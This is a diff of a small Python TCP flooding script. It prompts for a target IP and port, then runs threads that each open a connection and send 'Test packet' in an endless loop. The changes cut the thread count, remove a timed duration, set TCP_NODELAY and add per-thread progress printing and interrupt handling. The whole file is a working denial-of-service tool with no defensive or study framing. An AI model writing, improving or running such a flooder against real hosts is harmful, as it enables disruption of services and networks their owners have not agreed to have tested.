@@ -1,34 +1,33 @@
 import socket
 import threading
-import time
 
 TARGET_IP = input("TARGET IP: ")
 TARGET_PORT = int(input("OPEN PORT: "))
-NUM_THREADS = 1000
-DURATION = 99999999999999999999999999999999999999999999999999
+NUM_THREADS = 50
 
 def send_packets():
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((TARGET_IP, TARGET_PORT))
-        end_time = time.time() + DURATION
+        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)  # natychmiastowe wysyłanie
         count = 0
-        while time.time() < end_time:
+        while True:
             s.sendall(b"Test packet\n")
             count += 1
-        s.close()
-        print(f"Packets sent: {count}")
+            if count % 10000 == 0:
+                print(f"{threading.current_thread().name} sent {count} packets")
     except Exception as e:
-        print(f"Błąd: {e}")
+        print(f"Error in {threading.current_thread().name}: {e}")
 
 threads = []
 
-for _ in range(NUM_THREADS):
-    t = threading.Thread(target=send_packets)
+for i in range(NUM_THREADS):
+    t = threading.Thread(target=send_packets, name=f"T{i+1}")
     t.start()
     threads.append(t)
 
-for t in threads:
-    t.join()
-
-print("Ended")
+try:
+    for t in threads:
+        t.join()
+except KeyboardInterrupt:
+    print("\nStopped manually")
